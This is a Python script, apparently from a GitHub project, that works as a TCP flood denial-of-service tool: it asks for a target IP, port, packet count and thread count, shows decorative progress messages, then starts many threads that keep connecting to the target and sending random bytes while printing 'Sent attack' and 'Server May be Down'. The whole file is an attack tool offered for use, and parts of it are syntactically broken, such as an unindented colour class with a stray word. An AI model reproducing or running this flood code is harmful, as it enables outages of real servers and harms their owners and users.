# _*_ coding: utf-8 _*_
# progressbar  - Text progress bar library for Python.
#TCP FLOOD
import os
import socket
import threading
import time
import random
import string
import datetime
import progressbar


# Colors
class bcolors: 
YELLOW = '\033[33m'
BLUE = '\033[32m'
inof 
    
# CLEAR
os.system("clear")
print("""
\033[33m                               ╔╗                   ╔╗
\033[33m                               ║║                   ║║
\033[32m ╔═══════╗╔═════╗╔═════╗\033[33m╔═════╗║║╔═════╗╔═════╗╔════╝║
\033[32m     ║║   ║║     ║║    ║\033[33m║║     ║║║║   ║║║║   ║║║║   ║║
\033[32m     ║║   ║║     ║║    ║\033[33m║║     ║║║║   ║║║║   ║║║║   ║║
\033[32m     ║║   ║║     ║╔════╝\033[33m║╔════ ║║║║   ║║║║   ║║║║   ║║
\033[32m     ╚╝   ╚═════╝╚╝\033[33m     ╚╝     ╚╝╚═════╝╚═════╝╚═════╝
\033[95m
\033[37m ╔══════════════════════════════════════════════════════════════╗        
\033[37m ║\033[33m  Author By: KunFay/https://github.com/KunFay99/TCPFL00D-DD0S\033[37m  ║
\033[37m ╚══════════════════════════════════════════════════════════════╝
""")
print("\033[94m==>")
ip = str(input("\033[93m[\033[93m+\033[92m]⟩⟩ IP Target : "))
print("\033[94m==>")
port = int(input("\033[92m[\033[95m+\033[92m]⟩⟩ Port : "))
print("\033[94m==>")
packs = int(input("\033[92m[\033[95m+\033[92m]⟩⟩ Packets{0} : "))
print("\033[94m==>")
thread = int(input("\033[92m[\033[95m+\033[92m]⟩⟩ Threads : "))
print("\033[94m==>")
time.sleep(5),
print("\033[96m25% "),
time.sleep(5),
print("\033[92m50% "),
time.sleep(5),
print("\033[1m75%  "),
time.sleep(5),
print("\033[97m100%"),
time.sleep(5),
print("\033[95mGo...!!"),
time.sleep(5),  
def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m#\033[97mLoading: progressbar.AnimatedMarker()\033[0m']
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print("\033[92m[" +str(u)+ "]  \033[32m[FOOODING WEBS]  \033[36mSent attack  \033[97mTarget: [" +ip+ "]  \033[0m")
        print("\033[93m[" +str(u)+ "]  \033[33m[FOOODING WEBS]  \033[96mSent attack  \033[92mTarget: [" +ip+ "]  \033[0m")
        
    except:
        s.close()
        print("\033[97m[★\033[97m]  \033[32mServer  \033[1mMay be   \033[33mDown \033[0m")
for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
